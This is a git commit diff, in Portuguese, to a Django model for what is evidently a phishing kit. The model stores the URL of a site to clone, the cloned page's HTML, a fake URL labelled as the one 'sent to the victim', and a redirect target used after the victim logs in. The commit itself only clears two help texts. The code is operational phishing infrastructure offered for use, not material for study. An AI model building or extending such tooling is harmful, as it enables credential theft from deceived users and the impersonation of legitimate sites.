6f0ff9041d6da4a8c224496ac572308b5dff8a78
iKrazyCode <dodochavescadete13@gmail.com>
2025-08-19 11:50:36 -0300

    update

--- custom_admin/models.py
+++ custom_admin/models.py
@@ -10,8 +10,8 @@ class TemplateCopy(models.Model):
     """
     title = models.CharField(verbose_name='Título para esse conteúdo', max_length=30, unique=True)
     url_clonar_base = models.URLField(verbose_name='URL base do site clonado', max_length=500, blank=True, null=True, help_text="Se for somente o dominio, <span style='color:red;'>sempre coloque / no final, exemplo: https://dominio.com/</span>")
-    url_clonar_page_especifica = models.URLField(verbose_name='URL da página especifica clonada', max_length=500, blank=True, null=True, help_text="Se for somente o dominio, <span style='color:red;'>sempre coloque / no final, exemplo: https://dominio.com/</span>")
-    url_fake = models.CharField(verbose_name='URL que será enviada para a vítima', max_length=500, unique=True, help_text="Ex: site.com/url/aqui/ -> <span style='color:red'>SEMPRE COLOQUE UMA BARRA NO FINAL !!!!!</span>")
+    url_clonar_page_especifica = models.URLField(verbose_name='URL da página especifica clonada', max_length=500, blank=True, null=True, help_text="")
+    url_fake = models.CharField(verbose_name='URL que será enviada para a vítima', max_length=500, unique=True, help_text="")
     content = models.TextField(verbose_name='HTML da página', blank=True, null=True, help_text="Site para transformar uma imagem em base64 para usar no site sem precisar upar imagem: <a href='https://base64.guru/converter/encode/image' target='_blank'>https://base64.guru/converter/encode/image</a> -> Forma de uso: src='<span style='color:red;'>data:image/png;base64,COLAR_O_BASE64_AQUI</span>' ")
     redirect = models.CharField(verbose_name='Para onde redirecionar após login', max_length=500, blank=True, null=True, help_text='Se deixar vazio, irá redirecionar para a própria tela de login')
 
